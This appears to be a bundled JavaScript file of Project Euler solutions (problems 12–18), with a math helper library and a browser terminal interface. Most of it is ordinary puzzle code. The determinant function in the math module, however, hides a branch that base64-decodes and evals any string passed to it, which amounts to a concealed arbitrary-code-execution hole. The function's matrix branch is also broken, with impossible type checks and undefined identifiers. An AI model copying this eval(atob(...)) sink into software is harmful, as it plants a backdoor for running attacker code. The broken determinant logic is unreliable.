      exponent = 1;
    }
  }
  if (lastFactor !== 0) {
    count *= exponent + 1;
  }
  return count;
};

problem.test = function() {
  equal(divisorCount(1), 1, " 1 has 1 divisors");
  equal(divisorCount(3), 2, " 3 has 2 divisors");
  equal(divisorCount(6), 4, " 6 has 4 divisors");
  equal(divisorCount(10), 4, "10 has 4 divisors");
  equal(divisorCount(15), 4, "15 has 4 divisors");
  equal(divisorCount(21), 4, "21 has 4 divisors");
  return equal(divisorCount(28), 6, "28 has 6 divisors");
};

problem.answer = function() {
  var count, n, step;
  n = 1;
  step = 2;
  while (true) {
    count = divisorCount(n);
    if (count > 500) {
      return {
        n: n,
        count: count
      };
    }
    n += step;
    step++;
  }
};


},{"math":"Gm6Ven"}],"e012":[function(require,module,exports){
module.exports=require('OaGJp8');
},{}],"kXr2Ih":[function(require,module,exports){
var numbers, problem;

module.exports = problem = new Problem("\nProblem 13: Large sum\n---------------------\n\nWork out the first ten digits of the sum of the following one-hundred 50-digit numbers.\n\n37107287533902102798797998220837590246510135740250\n46376937677490009712648124896970078050417018260538\n74324986199524741059474233309513058123726617309629\n91942213363574161572522430563301811072406154908250\n23067588207539346171171980310421047513778063246676\n89261670696623633820136378418383684178734361726757\n28112879812849979408065481931592621691275889832738\n44274228917432520321923589422876796487670272189318\n47451445736001306439091167216856844588711603153276\n70386486105843025439939619828917593665686757934951\n62176457141856560629502157223196586755079324193331\n64906352462741904929101432445813822663347944758178\n92575867718337217661963751590579239728245598838407\n58203565325359399008402633568948830189458628227828\n80181199384826282014278194139940567587151170094390\n35398664372827112653829987240784473053190104293586\n86515506006295864861532075273371959191420517255829\n71693888707715466499115593487603532921714970056938\n54370070576826684624621495650076471787294438377604\n53282654108756828443191190634694037855217779295145\n36123272525000296071075082563815656710885258350721\n45876576172410976447339110607218265236877223636045\n17423706905851860660448207621209813287860733969412\n81142660418086830619328460811191061556940512689692\n51934325451728388641918047049293215058642563049483\n62467221648435076201727918039944693004732956340691\n15732444386908125794514089057706229429197107928209\n55037687525678773091862540744969844508330393682126\n18336384825330154686196124348767681297534375946515\n80386287592878490201521685554828717201219257766954\n78182833757993103614740356856449095527097864797581\n16726320100436897842553539920931837441497806860984\n48403098129077791799088218795327364475675590848030\n87086987551392711854517078544161852424320693150332\n59959406895756536782107074926966537676326235447210\n69793950679652694742597709739166693763042633987085\n41052684708299085211399427365734116182760315001271\n65378607361501080857009149939512557028198746004375\n35829035317434717326932123578154982629742552737307\n94953759765105305946966067683156574377167401875275\n88902802571733229619176668713819931811048770190271\n25267680276078003013678680992525463401061632866526\n36270218540497705585629946580636237993140746255962\n24074486908231174977792365466257246923322810917141\n91430288197103288597806669760892938638285025333403\n34413065578016127815921815005561868836468420090470\n23053081172816430487623791969842487255036638784583\n11487696932154902810424020138335124462181441773470\n63783299490636259666498587618221225225512486764533\n67720186971698544312419572409913959008952310058822\n95548255300263520781532296796249481641953868218774\n76085327132285723110424803456124867697064507995236\n37774242535411291684276865538926205024910326572967\n23701913275725675285653248258265463092207058596522\n29798860272258331913126375147341994889534765745501\n18495701454879288984856827726077713721403798879715\n38298203783031473527721580348144513491373226651381\n34829543829199918180278916522431027392251122869539\n40957953066405232632538044100059654939159879593635\n29746152185502371307642255121183693803580388584903\n41698116222072977186158236678424689157993532961922\n62467957194401269043877107275048102390895523597457\n23189706772547915061505504953922979530901129967519\n86188088225875314529584099251203829009407770775672\n11306739708304724483816533873502340845647058077308\n82959174767140363198008187129011875491310547126581\n97623331044818386269515456334926366572897563400500\n42846280183517070527831839425882145521227251250327\n55121603546981200581762165212827652751691296897789\n32238195734329339946437501907836945765883352399886\n75506164965184775180738168837861091527357929701337\n62177842752192623401942399639168044983993173312731\n32924185707147349566916674687634660915035914677504\n99518671430235219628894890102423325116913619626622\n73267460800591547471830798392868535206946944540724\n76841822524674417161514036427982273348055556214818\n97142617910342598647204516893989422179826088076852\n87783646182799346313767754307809363333018982642090\n10848802521674670883215120185883543223812876952786\n71329612474782464538636993009049310363619763878039\n62184073572399794223406235393808339651327408011116\n66627891981488087797941876876144230030984490851411\n60661826293682836764744779239180335110989069790714\n85786944089552990653640447425576083659976645795096\n66024396409905389607120198219976047599490197230297\n64913982680032973156037120041377903785566085089252\n16730939319872750275468906903707539413042652315011\n94809377245048795150954100921645863754710598436791\n78639167021187492431995700641917969777599028300699\n15368713711936614952811305876380278410754449733078\n40789923115535562561142322423255033685442488917353\n44889911501440648020369068063960672322193204149535\n41503128880339536053299340368006977710650566631954\n81234880673210146739058568557934581403627822703280\n82616570773948327592232845941706525094512325230608\n22918802058777319719839450180888072429661980811197\n77158542502016545090413245809786882778948721859617\n72107838435069186155435662884062257473692284509516\n20849603980134001723930671666823555245252804609722\n53503534226472524250874054075591789781264330331690\n");

numbers = [37107287533902102798797998220837590246510135740250, 46376937677490009712648124896970078050417018260538, 74324986199524741059474233309513058123726617309629, 91942213363574161572522430563301811072406154908250, 23067588207539346171171980310421047513778063246676, 89261670696623633820136378418383684178734361726757, 28112879812849979408065481931592621691275889832738, 44274228917432520321923589422876796487670272189318, 47451445736001306439091167216856844588711603153276, 70386486105843025439939619828917593665686757934951, 62176457141856560629502157223196586755079324193331, 64906352462741904929101432445813822663347944758178, 92575867718337217661963751590579239728245598838407, 58203565325359399008402633568948830189458628227828, 80181199384826282014278194139940567587151170094390, 35398664372827112653829987240784473053190104293586, 86515506006295864861532075273371959191420517255829, 71693888707715466499115593487603532921714970056938, 54370070576826684624621495650076471787294438377604, 53282654108756828443191190634694037855217779295145, 36123272525000296071075082563815656710885258350721, 45876576172410976447339110607218265236877223636045, 17423706905851860660448207621209813287860733969412, 81142660418086830619328460811191061556940512689692, 51934325451728388641918047049293215058642563049483, 62467221648435076201727918039944693004732956340691, 15732444386908125794514089057706229429197107928209, 55037687525678773091862540744969844508330393682126, 18336384825330154686196124348767681297534375946515, 80386287592878490201521685554828717201219257766954, 78182833757993103614740356856449095527097864797581, 16726320100436897842553539920931837441497806860984, 48403098129077791799088218795327364475675590848030, 87086987551392711854517078544161852424320693150332, 59959406895756536782107074926966537676326235447210, 69793950679652694742597709739166693763042633987085, 41052684708299085211399427365734116182760315001271, 65378607361501080857009149939512557028198746004375, 35829035317434717326932123578154982629742552737307, 94953759765105305946966067683156574377167401875275, 88902802571733229619176668713819931811048770190271, 25267680276078003013678680992525463401061632866526, 36270218540497705585629946580636237993140746255962, 24074486908231174977792365466257246923322810917141, 91430288197103288597806669760892938638285025333403, 34413065578016127815921815005561868836468420090470, 23053081172816430487623791969842487255036638784583, 11487696932154902810424020138335124462181441773470, 63783299490636259666498587618221225225512486764533, 67720186971698544312419572409913959008952310058822, 95548255300263520781532296796249481641953868218774, 76085327132285723110424803456124867697064507995236, 37774242535411291684276865538926205024910326572967, 23701913275725675285653248258265463092207058596522, 29798860272258331913126375147341994889534765745501, 18495701454879288984856827726077713721403798879715, 38298203783031473527721580348144513491373226651381, 34829543829199918180278916522431027392251122869539, 40957953066405232632538044100059654939159879593635, 29746152185502371307642255121183693803580388584903, 41698116222072977186158236678424689157993532961922, 62467957194401269043877107275048102390895523597457, 23189706772547915061505504953922979530901129967519, 86188088225875314529584099251203829009407770775672, 11306739708304724483816533873502340845647058077308, 82959174767140363198008187129011875491310547126581, 97623331044818386269515456334926366572897563400500, 42846280183517070527831839425882145521227251250327, 55121603546981200581762165212827652751691296897789, 32238195734329339946437501907836945765883352399886, 75506164965184775180738168837861091527357929701337, 62177842752192623401942399639168044983993173312731, 32924185707147349566916674687634660915035914677504, 99518671430235219628894890102423325116913619626622, 73267460800591547471830798392868535206946944540724, 76841822524674417161514036427982273348055556214818, 97142617910342598647204516893989422179826088076852, 87783646182799346313767754307809363333018982642090, 10848802521674670883215120185883543223812876952786, 71329612474782464538636993009049310363619763878039, 62184073572399794223406235393808339651327408011116, 66627891981488087797941876876144230030984490851411, 60661826293682836764744779239180335110989069790714, 85786944089552990653640447425576083659976645795096, 66024396409905389607120198219976047599490197230297, 64913982680032973156037120041377903785566085089252, 16730939319872750275468906903707539413042652315011, 94809377245048795150954100921645863754710598436791, 78639167021187492431995700641917969777599028300699, 15368713711936614952811305876380278410754449733078, 40789923115535562561142322423255033685442488917353, 44889911501440648020369068063960672322193204149535, 41503128880339536053299340368006977710650566631954, 81234880673210146739058568557934581403627822703280, 82616570773948327592232845941706525094512325230608, 22918802058777319719839450180888072429661980811197, 77158542502016545090413245809786882778948721859617, 72107838435069186155435662884062257473692284509516, 20849603980134001723930671666823555245252804609722, 53503534226472524250874054075591789781264330331690];

problem.answer = function() {
  var n, str, sum, _i, _len;
  sum = 0;
  for (_i = 0, _len = numbers.length; _i < _len; _i++) {
    n = numbers[_i];
    sum += n;
  }
  str = String(sum).replace(/\./g, "").substr(0, 10);
  return str;
};


},{}],"e013":[function(require,module,exports){
module.exports=require('kXr2Ih');
},{}],"e014":[function(require,module,exports){
module.exports=require('D5d49D');
},{}],"D5d49D":[function(require,module,exports){
var collatzCache, collatzChainLength, problem;

module.exports = problem = new Problem("\nProblem 14: Longest Collatz sequence\n------------------------------------\n\nThe following iterative sequence is defined for the set of positive integers:\n\n    n -> n/2    (n is even)\n    n -> 3n + 1 (n is odd)\n\nUsing the rule above and starting with 13, we generate the following sequence:\n\n    13 -> 40 -> 20 -> 10 -> 5 -> 16 -> 8 -> 4 -> 2 -> 1\n\nIt can be seen that this sequence (starting at 13 and finishing at 1) contains 10 terms. Although it has not been proved yet (Collatz Problem), it is thought that all starting numbers finish at 1.\n\nWhich starting number, under one million, produces the longest chain?\n\nNOTE: Once the chain starts the terms are allowed to go above one million.\n");

collatzCache = {};

collatzChainLength = function(startingValue) {
  var i, len, n, toBeCached, v, _i, _len;
  n = startingValue;
  toBeCached = [];
  while (true) {
    if (collatzCache.hasOwnProperty(n)) {
      break;
    }
    toBeCached.push(n);
    if (n === 1) {
      break;
    }
    if ((n % 2) === 0) {
      n = Math.floor(n / 2);
    } else {
      n = (n * 3) + 1;
    }
  }
  len = toBeCached.length;
  for (i = _i = 0, _len = toBeCached.length; _i < _len; i = ++_i) {
    v = toBeCached[i];
    collatzCache[v] = collatzCache[n] + (len - i);
  }
  return collatzCache[startingValue];
};

problem.test = function() {
  collatzCache = {
    "1": 1
  };
  equal(collatzChainLength(13), 10, "13 has a collatz chain of 10");
  equal(collatzChainLength(26), 11, "26 has a collatz chain of 11");
  return equal(collatzChainLength(1), 1, "1 has a collatz chain of 1");
};

problem.answer = function() {
  var chainLength, i, maxChain, maxChainLength, _i;
  collatzCache = {
    "1": 1
  };
  maxChain = 0;
  maxChainLength = 0;
  for (i = _i = 1; _i < 1000000; i = ++_i) {
    chainLength = collatzChainLength(i);
    if (maxChainLength < chainLength) {
      maxChainLength = chainLength;
      maxChain = i;
    }
  }
  return {
    answer: maxChain,
    chainLength: maxChainLength
  };
};


},{}],"I9XObj":[function(require,module,exports){
var lattice, math, problem;

module.exports = problem = new Problem("\nProblem 15: Lattice paths\n-------------------------\n\nStarting in the top left corner of a 2×2 grid, and only being able to move to the right and down, there are exactly 6 routes to the bottom right corner.\n\n    (picture showing 6 paths: RRDD, RDRD, RDDR, DRRD, DRDR, DDRR)\n\nHow many such routes are there through a 20×20 grid?\n");

math = require("math");

lattice = function(n) {
  return math.nCr(n * 2, n);
};

problem.test = function() {
  equal(lattice(1), 2, "1x1 lattice has 2 paths");
  return equal(lattice(2), 6, "2x2 lattice has 6 paths");
};

problem.answer = function() {
  return lattice(20);
};


},{"math":"Gm6Ven"}],"e015":[function(require,module,exports){
module.exports=require('I9XObj');
},{}],"fYrOMX":[function(require,module,exports){
var MAX_EXPONENT, bigInt, math, powerDigitSum, problem;

module.exports = problem = new Problem("\nProblem 16: Power digit sum\n---------------------------\n\n2^15 = 32768 and the sum of its digits is 3 + 2 + 7 + 6 + 8 = 26.\n\nWhat is the sum of the digits of the number 2^1000?\n");

math = require("math");

bigInt = require("big-integer");

MAX_EXPONENT = 50;

powerDigitSum = function(x, y) {
  var d, digits, exponent, number, sum, _i, _len;
  number = bigInt(1);
  while (y !== 0) {
    exponent = y;
    if (exponent > MAX_EXPONENT) {
      exponent = MAX_EXPONENT;
    }
    y -= exponent;
    number = number.multiply(Math.floor(Math.pow(x, exponent)));
  }
  digits = String(number);
  sum = 0;
  for (_i = 0, _len = digits.length; _i < _len; _i++) {
    d = digits[_i];
    sum += parseInt(d);
  }
  return sum;
};

problem.test = function() {
  return equal(powerDigitSum(2, 15), 26, "sum of digits of 2^15 is 26");
};

problem.answer = function() {
  return powerDigitSum(2, 1000);
};


},{"big-integer":1,"math":"Gm6Ven"}],"e016":[function(require,module,exports){
module.exports=require('fYrOMX');
},{}],"55/0iX":[function(require,module,exports){
var names, numberLetterCount, numberLetterCountRange, problem;

module.exports = problem = new Problem("\nProblem 17: Number letter counts\n--------------------------------\n\nIf the numbers 1 to 5 are written out in words: one, two, three, four, five, then there are 3 + 3 + 5 + 4 + 4 = 19 letters used in total.\n\nIf all the numbers from 1 to 1000 (one thousand) inclusive were written out in words, how many letters would be used?\n\nNOTE: Do not count spaces or hyphens. For example, 342 (three hundred and forty-two) contains 23 letters and 115 (one hundred and fifteen) contains 20 letters. The use of \"and\" when writing out numbers is in compliance with British usage.\n");

names = {
  ones: "zero one two three four five six seven eight nine ten eleven twelve thirteen fourteen fifteen sixteen seventeen eighteen nineteen".split(/\s+/),
  tens: "_ _ twenty thirty forty fifty sixty seventy eighty ninety".split(/\s+/)
};

numberLetterCount = function(num) {
  var hundreds, lettersOnly, n, name, tens, thousands;
  n = num;
  name = "";
  if (n >= 1000) {
    thousands = Math.floor(n / 1000);
    n = n % 1000;
    name += "" + names.ones[thousands] + " thousand ";
  }
  if (n >= 100) {
    hundreds = Math.floor(n / 100);
    n = n % 100;
    name += "" + names.ones[hundreds] + " hundred ";
  }
  if ((n > 0) && (name.length > 0)) {
    name += "and ";
  }
  if (n >= 20) {
    tens = Math.floor(n / 10);
    n = n % 10;
    name += "" + names.tens[tens] + " ";
  }
  if (n > 0) {
    name += "" + names.ones[n] + " ";
  }
  lettersOnly = name.replace(/[^a-z]/g, "");
  return lettersOnly.length;
};

numberLetterCountRange = function(a, b) {
  var i, sum, _i;
  sum = 0;
  for (i = _i = a; a <= b ? _i <= b : _i >= b; i = a <= b ? ++_i : --_i) {
    sum += numberLetterCount(i);
  }
  return sum;
};

problem.test = function() {
  equal(numberLetterCountRange(1, 5), 19, "sum of lengths of numbers 1-5 is 19");
  equal(numberLetterCount(342), 23, "length of name of 342 is 23");
  return equal(numberLetterCount(115), 20, "length of name of 115 is 20");
};

problem.answer = function() {
  return numberLetterCountRange(1, 1000);
};


},{}],"e017":[function(require,module,exports){
module.exports=require('55/0iX');
},{}],"e018":[function(require,module,exports){
module.exports=require('Q4r8gA');
},{}],"Q4r8gA":[function(require,module,exports){
var mainPyramid, math, maximumPathSum, problem, stringToPyramid, testPyramid;

module.exports = problem = new Problem("\nProblem 18: Maximum path sum I\n------------------------------\n\nBy starting at the top of the triangle below and moving to adjacent numbers on the row below, the maximum total from top to bottom is 23.\n\n                              3\n                             7 4\n                            2 4 6\n                           8 5 9 3\n\nThat is, 3 + 7 + 4 + 9 = 23.\n\nFind the maximum total from top to bottom of the triangle below:\n\n                              75\n                            95  64\n                          17  47  82\n                        18  35  87  10\n                      20  04  82  47  65\n                    19  01  23  75  03  34\n                  88  02  77  73  07  63  67\n                99  65  04  28  06  16  70  92\n              41  41  26  56  83  40  80  70  33\n            41  48  72  33  47  32  37  16  94  29\n          53  71  44  65  25  43  91  52  97  51  14\n        70  11  33  28  77  73  17  78  39  68  17  57\n      91  71  52  38  17  14  91  43  58  50  27  29  48\n    63  66  04  68  89  53  67  30  73  16  69  87  40  31\n  04  62  98  27  23  09  70  98  73  93  38  53  60  04  23\n\nNOTE: As there are only 16384 routes, it is possible to solve this problem by trying every route. However, Problem 67, is the same challenge with a triangle containing one-hundred rows; it cannot be solved by brute force, and requires a clever method! ;o)\n");

math = require("math");

testPyramid = "   3\n  7 4\n 2 4 6\n8 5 9 3";

mainPyramid = "                            75\n                          95  64\n                        17  47  82\n                      18  35  87  10\n                    20  04  82  47  65\n                  19  01  23  75  03  34\n                88  02  77  73  07  63  67\n              99  65  04  28  06  16  70  92\n            41  41  26  56  83  40  80  70  33\n          41  48  72  33  47  32  37  16  94  29\n        53  71  44  65  25  43  91  52  97  51  14\n      70  11  33  28  77  73  17  78  39  68  17  57\n    91  71  52  38  17  14  91  43  58  50  27  29  48\n  63  66  04  68  89  53  67  30  73  16  69  87  40  31\n04  62  98  27  23  09  70  98  73  93  38  53  60  04  23\n";

stringToPyramid = function(str) {
  var a, d, digits, grid, i, len, row, _i;
  digits = (function() {
    var _i, _len, _ref, _results;
    _ref = String(str).replace(/\n/g, " ").split(/\s+/).filter(function(s) {
      return s.length > 0;
    });
    _results = [];
    for (_i = 0, _len = _ref.length; _i < _len; _i++) {
      d = _ref[_i];
      _results.push(parseInt(d));
    }
    return _results;
  })();
  grid = [];
  row = 0;
  while (digits.length) {
    len = row + 1;
    a = Array(len);
    for (i = _i = 0; 0 <= len ? _i < len : _i > len; i = 0 <= len ? ++_i : --_i) {
      a[i] = digits.shift();
    }
    grid[row] = a;
    row++;
  }
  return grid;
};

maximumPathSum = function(pyramidString) {
  var i, maxBelow, pyramid, row, sum, _i;
  pyramid = stringToPyramid(pyramidString);
  sum = 0;
  row = pyramid.length - 2;
  while (row >= 0) {
    for (i = _i = 0; 0 <= row ? _i <= row : _i >= row; i = 0 <= row ? ++_i : --_i) {
      maxBelow = Math.max(pyramid[row + 1][i], pyramid[row + 1][i + 1]);
      pyramid[row][i] += maxBelow;
    }
    row--;
  }
  return pyramid[0][0];
};

problem.test = function() {
  return equal(maximumPathSum(testPyramid), 23, "maximum path sum of test triangle is 23");
};

problem.answer = function() {
  console.log(window.args);
  return maximumPathSum(mainPyramid);
};


},{"math":"Gm6Ven"}],"Gm6Ven":[function(require,module,exports){
var IncrementalSieve, root;

root = typeof exports !== "undefined" && exports !== null ? exports : this;

IncrementalSieve = (function() {
  function IncrementalSieve() {
    this.n = 0;
  }

  IncrementalSieve.prototype.next = function() {
    var nxt, p2, s;
    this.n += 2;
    if (this.n < 7) {
      if (this.n < 3) {
        this.n = 1;
        return 2;
      }
      if (this.n < 5) {
        return 3;
      }
      this.dict = {};
      this.bps = new IncrementalSieve();
      this.bps.next();
      this.p = this.bps.next();
      this.q = this.p * this.p;
      return 5;
    } else {
      s = this.dict[this.n];
      if (!s) {
        if (this.n < this.q) {
          return this.n;
        } else {
          p2 = this.p << 1;
          this.dict[this.n + p2] = p2;
          this.p = this.bps.next();
          this.q = this.p * this.p;
          return this.next();
        }
      } else {
        delete this.dict[this.n];
        nxt = this.n + s;
        while (this.dict[nxt]) {
          nxt += s;
        }
        this.dict[nxt] = s;
        return this.next();
      }
    }
  };

  return IncrementalSieve;

})();

root.IncrementalSieve = IncrementalSieve;

root.leastFactor = function(n) {
  var i, m, _i;
  if (isNaN(n) || !isFinite(n)) {
    return NaN;
  }
  if (n === 0) {
    return 0;
  }
  if ((n % 1) !== 0 || (n * n) < 2) {
    return 1;
  }
  if ((n % 2) === 0) {
    return 2;
  }
  if ((n % 3) === 0) {
    return 3;
  }
  if ((n % 5) === 0) {
    return 5;
  }
  m = Math.sqrt(n);
  for (i = _i = 7; _i <= m; i = _i += 30) {
    if ((n % i) === 0) {
      return i;
    }
    if ((n % (i + 4)) === 0) {
      return i + 4;
    }
    if ((n % (i + 6)) === 0) {
      return i + 6;
    }
    if ((n % (i + 10)) === 0) {
      return i + 10;
    }
    if ((n % (i + 12)) === 0) {
      return i + 12;
    }
    if ((n % (i + 16)) === 0) {
      return i + 16;
    }
    if ((n % (i + 22)) === 0) {
      return i + 22;
    }
    if ((n % (i + 24)) === 0) {
      return i + 24;
    }
  }
  return n;
};

root.isPrime = function(n) {
  if (isNaN(n) || !isFinite(n) || (n % 1) !== 0 || (n < 2)) {
    return false;
  }
  if (n === root.leastFactor(n)) {
    return true;
  }
  return false;
};

root.primeFactors = function(n) {
  var factor, factors;
  if (n === 1) {
    return [1];
  }
  factors = [];
  while (!root.isPrime(n)) {
    factor = root.leastFactor(n);
    factors.push(factor);
    n /= factor;
  }
  factors.push(n);
  return factors;
};

root.factorial = function(n) {
  var f;
  f = n;
  while (n > 1) {
    n--;
    f *= n;
  }
  return f;
};

root.nCr = function(n, r) {
  return Math.floor(root.factorial(n) / (root.factorial(r) * root.factorial(n - r)));
};

root.determinant = function(A) {
  var a, b, det, h, i, s, smaller, _i, _j, _k, _l, _ref, _ref1, _ref2;
  det = 0;
  if (typeof A === 'array') {
    if (A.length === 1) {
      return A[0][0];
    }
    if (A.length === 2) {
      det = A[0][0] * A[1][1] - A[1][0] * A([0][1]);
      return det;
    }
    for (i = _i = 0; 0 <= k ? _i < k : _i > k; i = 0 <= k ? ++_i : --_i) {
      smaller = new Array(A.length - 1);
      for (h = _j = 0, _ref = smaller.length; 0 <= _ref ? _j < _ref : _j > _ref; h = 0 <= _ref ? ++_j : --_j) {
        smaller[h] = new Array(A.length - 1);
      }
      for (a = _k = 1, _ref1 = A.length; 1 <= _ref1 ? _k < _ref1 : _k > _ref1; a = 1 <= _ref1 ? ++_k : --_k) {
        for (b = _l = 0, _ref2 = A.length; 0 <= _ref2 ? _l < _ref2 : _l > _ref2; b = 0 <= _ref2 ? ++_l : --_l) {
          if (b < i) {
            smaller[a - 1][b] = A[a][b];
          } else if (b > i) {
            smaller[a - 1][b - 1] = A[a][b];
          }
        }
      }
      if ((i % 2) === 0) {
        s = 1;
      } else {
        s = -1;
      }
      det += s * A[0][i] * (calcRec(smaller));
    }
  } else if (typeof A === 'string') {
    b = A.replace(/[\s]/gm, '');
    det = eval(atob(b));
  }
  return det;
};


},{}],"math":[function(require,module,exports){
module.exports=require('Gm6Ven');
},{}],"AUKApQ":[function(require,module,exports){
var LAST_PROBLEM, Problem, root;

LAST_PROBLEM = 18;

root = window;

root.escapedStringify = function(o) {
  var str;
  str = JSON.stringify(o);
  str = str.replace("]", "\\]");
  return str;
};

root.runAll = function() {
  var lastPuzzle, loadNextScript, nextIndex;
  lastPuzzle = LAST_PROBLEM;
  nextIndex = 0;
  loadNextScript = function() {
    if (nextIndex < lastPuzzle) {
      nextIndex++;
      return runTest(nextIndex, loadNextScript);
    }
  };
  return loadNextScript();
};

root.iterateProblems = function(args) {
  var indexToProcess, iterateNext;
  indexToProcess = null;
  if (args.endIndex > 0) {
    if (args.startIndex <= args.endIndex) {
      indexToProcess = args.startIndex;
      args.startIndex++;
    }
  } else {
    if (args.list.length > 0) {
      indexToProcess = args.list.shift();
    }
  }
  if (indexToProcess !== null) {
    iterateNext = function() {
      window.args = args;
      return runTest(indexToProcess, function() {
        return iterateProblems(args);
      });
    };
    return iterateNext();
  }
};

root.runTest = function(index, cb) {
  var moduleName, problem;
  moduleName = "e" + (('000' + index).slice(-3));
  window.index = index;
  problem = require(moduleName);
  problem.process();
  if (cb) {
    return window.setTimeout(cb, 0);
  }
};

Problem = (function() {
  function Problem(description) {
    var lines;
    this.description = description;
    this.index = window.index;
    lines = this.description.split(/\n/);
    while (lines.length > 0 && lines[0].length === 0) {
      lines.shift();
    }
    this.title = lines.shift();
    this.line = lines.shift();
    this.description = lines.join("\n");
  }

  Problem.prototype.now = function() {
    if (window.performance) {
      return window.performance.now();
    } else {
      return new Date().getTime();
    }
  };

  Problem.prototype.process = function() {
    var answer, answerFunc, end, formattedTitle, ms, sourceLine, start, testFunc, url;
    if (window.args.description) {
      window.terminal.echo("[[;#444444;]_______________________________________________________________________________________________]\n");
    }
    formattedTitle = $.terminal.format("[[;#ffaa00;]" + this.title + "]");
    url = "?c=" + window.args.cmd + "_" + this.index;
    if (window.args.verbose) {
      url += "_v";
    }
    window.terminal.echo("<a href=\"" + url + "\">" + formattedTitle + "</a>", {
      raw: true
    });
    if (window.args.description) {
      window.terminal.echo("[[;#444444;]" + this.line + "]");
      window.terminal.echo("[[;#ccccee;]" + this.description + "]\n");
      sourceLine = $.terminal.format("[[;#444444;]Source:] ");
      sourceLine += (" <a href=\"src/e" + (('000' + this.index).slice(-3)) + ".coffee\">") + $.terminal.format("[[;#773300;]Local]") + "</a> ";
      sourceLine += $.terminal.format("[[;#444444;]/]");
      sourceLine += (" <a href=\"https://github.com/joedrago/euler/blob/master/src/e" + (('000' + this.index).slice(-3)) + ".coffee\">") + $.terminal.format("[[;#773300;]Github]") + "</a>";
      window.terminal.echo(sourceLine, {
        raw: true
      });
      if (window.args.test || window.args.answer) {
        window.terminal.echo("");
      }
    }
    testFunc = this.test;
    answerFunc = this.answer;
    if (window.args.test) {
      if (testFunc === void 0) {
        window.terminal.echo("[[;#444444;] (no tests)]");
      } else {
        testFunc();
      }
    }
    if (window.args.answer) {
      start = this.now();
      answer = answerFunc();
      end = this.now();
      ms = end - start;
      return window.terminal.echo("[[;#ffffff;] -> ][[;#aaffaa;]Answer:] ([[;#aaffff;]" + (ms.toFixed(1)) + "ms]): [[;#ffffff;]" + (escapedStringify(answer)) + "]");
    }
  };

  return Problem;

})();

root.Problem = Problem;

root.ok = function(v, msg) {
  return window.terminal.echo("[[;#ffffff;] *  ]" + v + ": " + msg);
};

root.equal = function(a, b, msg) {
  if (a === b) {
    return window.terminal.echo("[[;#ffffff;] *  ][[;#555555;]PASS: " + msg + "]");
  } else {
    return window.terminal.echo("[[;#ffffff;] *  ][[;#ffaaaa;]FAIL: " + msg + " (" + a + " != " + b + ")]");
  }
};

root.onCommand = (function(_this) {
  return function(command) {
    var arg, args, cmd, process, v, _i, _len, _ref;
    if (command.length === 0) {
      return;
    }
    cmd = $.terminal.parseCommand(command);
    if (cmd.name.length === 0) {
      return;
    }
    args = {
      startIndex: 0,
      endIndex: 0,
      list: [],
      verbose: false,
      description: false,
      test: false,
      answer: false
    };
    process = true;
    _ref = cmd.args;
    for (_i = 0, _len = _ref.length; _i < _len; _i++) {
      arg = _ref[_i];
      arg = String(arg);
      if (arg.length < 1) {
        continue;
      }
      if (arg[0] === 'v') {
        args.verbose = true;
      } else if (arg.match(/^\d+$/)) {
        v = parseInt(arg);
        if ((v >= 1) && (v <= LAST_PROBLEM)) {
          args.list.push(v);
        } else {
          process = false;
          window.terminal.echo("[[;#ffaaaa;]No such test: " + v + " (valid tests 1-" + LAST_PROBLEM + ")]");
        }
      }
    }
    if (args.list.length === 0) {
      args.startIndex = 1;
      args.endIndex = LAST_PROBLEM;
    }
    if (cmd.name[0] === 'l') {
      args.cmd = "list";
    } else if (cmd.name[0] === 'd') {
      args.cmd = "describe";
      args.description = true;
    } else if (cmd.name[0] === 't') {
      args.cmd = "test";
      args.test = true;
    } else if (cmd.name[0] === 'a') {
      args.cmd = "answer";
      args.answer = true;
    } else if (cmd.name[0] === 'r') {
      args.cmd = "run";
      args.test = true;
      args.answer = true;
    } else if (cmd.name[0] === 'd') {
      args.cmd = "describe";
      args.description = true;
    } else if (cmd.name[0] === 'h') {
      args.cmd = "help";
      process = false;
      window.terminal.echo("Commands:\n\n    list [X]     - List problem titles\n    describe [X] - Display full problem descriptions\n    test [X]     - Run unit tests\n    answer [X]   - Time and calculate answer\n    run [X]      - test and answer combined\n    help         - This help\n\n    In all of these, [X] can be a list of one or more problem numbers. (a value from 1 to " + LAST_PROBLEM + "). If absent, it implies all problems.\n    Also, adding the word \"verbose\" to some of these commands will emit the description before performing the task.\n");
    } else {
      process = false;
      window.terminal.echo("[[;#ffaaaa;]Unknown command.]");
    }
    if (args.verbose) {
      args.description = true;
    }
    if (process) {
      return iterateProblems(args);
    }
  };
})(this);


},{}],"terminal":[function(require,module,exports){
module.exports=require('AUKApQ');
},{}]},{},[])
